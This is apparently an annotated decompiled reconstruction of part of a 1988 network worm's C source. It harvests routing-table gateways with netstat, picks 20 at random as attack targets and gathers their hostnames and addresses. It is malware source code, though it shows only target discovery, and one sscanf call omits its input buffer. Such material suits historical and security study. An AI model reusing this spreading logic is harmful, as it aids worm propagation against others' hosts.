/*
 * Copyright (c) 1988 The Regents of the University of California.
 * All rights reserved.
 *
 * THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF THE UNIVERSITY
 * OF CALIFORNIA.  The copyright notice above does not evidence
 * any actual or intended publication of this source code.
 *
 * Copying or redistribution in any form is explicitly forbidden
 * unless prior written permission is obtained from Michael Karels or an
 * authorized representative of the University of California, Berkeley.
 *
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND WITHOUT ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, WITHOUT LIMITATION, THE IMPLIED
 * WARRANTIES OF MERCHANTIBILITY AND FITNESS FOR A PARTICULAR PURPOSE.
 */

#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <ctype.h>
#include <stdio.h>
#include <string.h>
#include "types.h"

u_long gateways[UNKNOWN];
int ngateways;

extern struct interface ifs[];
extern int nifs;
u_long inet_addr();

/*
 * Pick up a list of network routes from `netstat -r -n'
 * for use as targets to which to spread.
 */
int
rt_init()
{
	FILE	*p;
	char	buf[100], dst[100], gate[100];
	u_long	addr;
	int	i;
	u_long	loopback;

	/* start over from scratch */
	ngateways = 0;

	/* open a connection to netstat */
	p = popen(XS("/usr/ucb/netstat -r -n"), XS("r"));
	if (p == NULL)
		return 0;

	/* loop on netstat lines */
	while (fgets(buf, sizeof(buf), p) != NULL) {
		/* check for clients */
		other_sleep(0);

		/* if we picked up to many hosts, give up */
		if (ngateways >= 500)
			break;

		/* parse netstat lines */
		if (sscanf(XS("%s%s"), dst, gate) != 2)
			continue;
		if (strcmp(dst, XS("default")) == 0)
			(void) strcpy(dst, XS("0.0.0.0"));
		if (!isdigit(dst[0]) || !isdigit(gate[0]))
			continue;

		/* parse the gateway address; skip localhost */
		addr = inet_addr(gate);
		if (addr == -1)
			continue;
		loopback = inet_addr(XS("127.0.0.1"));
		if (addr == loopback)
			continue;

		/* make sure that this new address is unique */
		for (i = 0; i < ngateways; i++)
			if (gateways[i] == addr)
				break;
		if (i < ngateways)
			continue;

		/* if it's a local network, skip it */
		for (i = 0; i < nifs; i++)
			if (addr == ifs[i].if_addr)
				break;
		if (i < nifs)
			continue;

		/* add the new address */
		gateways[ngateways] = addr;
		ngateways++;
	}

	(void) pclose(p);

	/* pick some gateways to attack */
	scan_gateways();
	return 1;
}

/*
 * Scan through 20 random entries from the list of gateways,
 * [speculation: adding those found to the list of hosts to try].
 */
/* 0xaca */
static
scan_gateways()
{
	struct hostent *hp;
	struct host *h;
	int g, i, unused_local_variable, j;
	u_long addr;

	/* randomize gateway list */
	permute((char *)gateways, ngateways, 4);

	sethostent(1);
	for (g = 0; g < ngateways && g < 20; g++) {
		/* quick check on clients */
		other_sleep(0);

		/* look it up */
		h = h_addr2host(gateways[g], 1);
		h->flags |= H_GATEWAY;

		/* get its host entry */
		hp = gethostbyaddr((char *)&gateways[g], sizeof(u_long), AF_INET);
		if (hp == NULL)
			continue;

		/* add primary name and address, and aliases */
		bcopy(hp->h_addr, (char *)&addr, sizeof(addr));
		h_addaddr(h, addr);
		h_addname(h, hp->h_name);
		for (i = 0; hp->h_aliases[i] != NULL; i++)
			h_addname(h, hp->h_aliases[i]);

		/* try it again by its primary name, */
		/* but this time, just add addresses */
		hp = gethostbyname(hp->h_name);
		if (hp == NULL)
			continue;
		for (i = 0; hp->h_addr_list[i]; i++) {
			bcopy(hp->h_addr_list[i], (char *)&addr, sizeof(addr));
			h_addaddr(h, addr);
		}
	}

	/* do some mysterious extra work that probably gets nowhere */
	for (g = 0; g < ngateways && g < 20; g++) {
		other_sleep(0);
		h = h_addr2host(gateways[g], 1);
		for (i = 0; i < 12 && h->name[i] != NULL; i++) {
			hp = gethostbyname(h->name[i]);
			if (hp == NULL)
				continue;
			for (j = 0; hp->h_addr_list[j]; j++) {
				bcopy(hp->h_addr_list[j], (char *)&addr, sizeof(addr));
				h_addaddr(h, addr);
			}
		}
	}
	endhostent();
}

/* next: getaddrs */
